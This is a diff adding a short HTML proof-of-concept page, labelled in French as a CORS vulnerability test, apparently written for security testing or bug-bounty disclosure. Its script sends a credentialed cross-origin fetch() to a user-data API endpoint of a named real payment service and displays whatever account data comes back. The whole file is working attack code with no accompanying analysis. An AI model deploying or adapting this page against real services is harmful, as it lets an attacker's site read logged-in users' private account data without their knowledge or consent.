@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>🔥 PoC CORS</h1>
+    <p>Test de vulnérabilité CORS depuis domaine externe</p>
+    <script>
+      fetch("https://order.ds.alipayplus.com/api/user", {
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.body.innerHTML += "<pre>" + data + "</pre>";
+        console.log("[✔] Réponse :", data);
+      })
+      .catch(e => {
+        document.body.innerHTML += "<pre>❌ Erreur : " + e + "</pre>";
+      });
+    </script>
+  </body>
+</html>
